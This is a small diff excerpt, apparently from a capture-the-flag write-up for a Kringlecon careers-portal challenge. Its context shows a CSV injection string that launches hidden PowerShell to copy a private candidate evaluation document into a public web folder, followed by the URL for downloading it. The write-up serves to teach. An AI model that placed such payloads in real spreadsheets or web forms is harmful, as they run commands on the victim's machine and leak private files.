@@ -35,3 +35,4 @@ Here is an alternate CSV injection string that uses PowerShell to copy the file:
  =cmd|'/c powershell.exe -w hidden $e=(copy C:\candidate_evaluation.docx C:\careerportal\resources\public\c2.docx);powershell -e $e'!A1
 
 In this case, https://careers.kringlecastle.com/public/c2.docx is needed to download the document.
+
